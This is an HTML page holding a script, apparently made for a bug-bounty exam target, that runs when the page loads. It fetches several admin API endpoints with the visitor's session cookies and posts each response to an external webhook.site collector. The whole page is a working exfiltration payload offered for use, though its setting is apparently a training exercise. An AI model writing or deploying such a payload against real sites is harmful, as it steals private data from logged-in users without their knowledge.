<!DOCTYPE html>
<html>
<body>
    <script>
        const webh = "https://webhook.site/966eca5b-8dbd-405f-895e-a47c742aa523";
        const base = "https://api-bugbounty-exam.hashacademy.co";

        const finalAttempts = [
            "/api/auth/profile",            // Fetching the Admin's own profile
            "/api/admin/users/me",          // Common admin alias
            "/api/admin/settings",          // System-wide settings
            "/api/admin/licenses",          // Where "verifiedLicenses" (from stats) live
            "/api/v1/admin/verification"    // Specialized flag endpoint
        ];

        finalAttempts.forEach(path => {
            fetch(base + path, { credentials: "include" })
                .then(r => r.text())
                .then(data => {
                    fetch(webh, {
                        method: "POST",
                        body: JSON.stringify({ path: path, data: data })
                    });
                }).catch(e => {});
        });
    </script>
</body>
</html>
